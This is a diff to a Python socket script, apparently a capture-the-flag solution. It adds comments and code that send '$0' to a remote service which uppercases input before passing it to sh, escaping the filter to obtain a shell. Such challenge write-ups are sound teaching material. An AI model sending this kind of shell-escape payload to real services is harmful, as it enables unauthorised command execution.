@@ -24,5 +24,20 @@ remote.send('\n')
 time.sleep(1)
 output = remote.recv(65535)
 print(output.decode())
+"""
+>> ls
+sh: 1: LS: not found
+"""
+# from above, we can see that whatever command that we passed into it
+# will be changed into an uppercase version of the command
+# and then passed to sh to be executed
+# reference: https://unix.stackexchange.com/questions/280454/what-is-the-meaning-of-0-in-the-bash-shell
+# therefore, we will be able to get access to sh by using the command $0
+
+remote.send('$0')
+remote.send('\n')
+time.sleep(1)
+output = remote.recv(65535)
+print(output.decode())
 
 client.close()
